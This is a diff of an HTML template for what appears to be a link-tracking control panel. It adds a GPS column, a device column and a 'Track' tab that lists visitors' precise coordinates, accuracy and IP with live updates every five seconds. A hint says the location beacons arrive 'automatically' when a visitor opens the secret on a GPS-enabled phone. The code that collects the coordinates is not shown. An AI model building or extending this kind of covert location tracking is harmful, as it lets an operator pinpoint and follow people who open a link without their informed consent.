@@ -84,6 +84,7 @@
     <button class="cp-tab" id="nav-ips">IP Addresses</button>
     <button class="cp-tab" id="nav-analysis">Analysis</button>
     <button class="cp-tab" id="nav-logs">Raw Logs</button>
+    <button class="cp-tab" id="nav-track">Track</button>
     <button class="cp-tab" id="nav-settings">Settings</button>
   </nav>
 
@@ -194,6 +195,7 @@
               <div class="cp-tl-meta">
                 <span class="cp-ip-val" data-ip="{{ log.ip_address or '' }}">{{ log.ip_address or 'Unknown IP' }}</span>
                 {% if log.location %}<span>{{ log.location }}</span>{% endif %}
+                {% if log.gps_lat %}<a class="cp-gps-link" href="https://maps.google.com/?q={{ log.gps_lat }},{{ log.gps_lng }}" target="_blank" rel="noopener noreferrer" title="Precise GPS location">📍 {{ log.gps_lat | round(4) }}, {{ log.gps_lng | round(4) }}</a>{% endif %}
                 {% if log.timezone %}<span class="cp-tl-tz">{{ log.timezone }}</span>{% endif %}
                 {% if log.org %}<span>{{ log.org }}</span>{% endif %}
                 {% if log.accept_language %}<span class="cp-tl-lang" title="Accept-Language">🌐 {{ log.accept_language | truncate(30) }}</span>{% endif %}
@@ -368,6 +370,8 @@
               <th>Time</th>
               <th>IP</th>
               <th>Location / TZ</th>
+              <th>GPS</th>
+              <th>Device</th>
               <th>Language</th>
               <th>Fetch context</th>
               <th>Labels</th>
@@ -377,7 +381,7 @@
           </thead>
           <tbody>
             {% if logs | length == 0 %}
-              <tr><td colspan="8" class="cp-empty">No logs yet.</td></tr>
+              <tr><td colspan="10" class="cp-empty">No logs yet.</td></tr>
             {% else %}
               {% for log in logs %}
               <tr>
@@ -387,6 +391,11 @@
                   <div>{{ log.location or '—' }}</div>
                   {% if log.org %}<div class="cp-sub">{{ log.org }}</div>{% endif %}
                   {% if log.timezone %}<div class="cp-sub cp-tz">{{ log.timezone }}</div>{% endif %}
+                </td>
+                <td>
+                  {% if log.gps_lat %}
+                    <a class="cp-gps-link" href="https://maps.google.com/?q={{ log.gps_lat }},{{ log.gps_lng }}" target="_blank" rel="noopener noreferrer">📍 {{ log.gps_lat | round(4) }}, {{ log.gps_lng | round(4) }}</a>
+                  {% else %}—{% endif %}
                 </td>
                 <td class="cp-mono">{{ log.accept_language or '—' }}</td>
                 <td>
@@ -411,6 +420,13 @@
                   {% endif %}
                 </td>
                 <td class="cp-trunc">{{ log.referer or '—' }}</td>
+                <td>
+                  {% set ua = log.user_agent | parseua %}
+                  {% if log.user_agent %}
+                    <div class="cp-ua-device">{{ ua.platform }}</div>
+                    <div class="cp-sub">{{ ua.browser }}</div>
+                  {% else %}—{% endif %}
+                </td>
               </tr>
               {% endfor %}
             {% endif %}
@@ -419,6 +435,48 @@
       </div>
     </div>
 
+
+    {# ══ TRACK ══ #}
+    <div id="tab-track" class="cp-panel">
+      <div class="cp-section-title">Location Track</div>
+      {% if beacons | length == 0 %}
+        <p class="cp-hint">No location beacons received yet. Beacons are sent automatically when a visitor reveals the secret on a mobile device with GPS enabled.</p>
+      {% else %}
+        <p class="cp-hint">
+          <strong>{{ beacons | length }}</strong> location beacon{{ 's' if beacons | length != 1 }} received.
+          Live updates every 5 seconds while the page is open.
+          <span id="beaconLiveIndicator" class="cp-beacon-live">● Live</span>
+        </p>
+      {% endif %}
+      <div class="cp-table-wrap">
+        <table class="cp-table" id="beaconTable">
+          <thead>
+            <tr>
+              <th>Time</th>
+              <th>Coordinates</th>
+              <th>Accuracy</th>
+              <th>IP</th>
+              <th>Map</th>
+            </tr>
+          </thead>
+          <tbody id="beaconTbody">
+            {% if beacons | length == 0 %}
+              <tr id="beaconEmptyRow"><td colspan="5" class="cp-empty">No beacons yet.</td></tr>
+            {% else %}
+              {% for b in beacons %}
+              <tr>
+                <td class="cp-mono cp-nowrap">{{ b.beaconed_at | datetime }}</td>
+                <td class="cp-mono">{{ b.gps_lat | round(6) }}, {{ b.gps_lng | round(6) }}</td>
+                <td class="cp-mono">{% if b.accuracy %}±{{ b.accuracy | round(0) }}m{% else %}—{% endif %}</td>
+                <td class="cp-mono"><span class="cp-ip-val" data-ip="{{ b.ip_address or '' }}">{{ b.ip_address or '—' }}</span></td>
+                <td><a class="cp-gps-link" href="https://maps.google.com/?q={{ b.gps_lat }},{{ b.gps_lng }}" target="_blank" rel="noopener noreferrer">📍 Open</a></td>
+              </tr>
+              {% endfor %}
+            {% endif %}
+          </tbody>
+        </table>
+      </div>
+    </div>
 
     {# ══ SETTINGS ══ #}
     <div id="tab-settings" class="cp-panel">
